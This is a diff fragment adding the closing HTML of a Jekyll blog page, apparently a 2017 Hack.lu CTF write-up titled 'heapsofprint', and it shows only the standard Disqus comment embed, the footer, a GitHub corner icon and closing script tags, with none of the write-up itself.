+        var disqus_url = 'https://kileak.github.io/ctf/2017/HackLu-heapsofprint';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
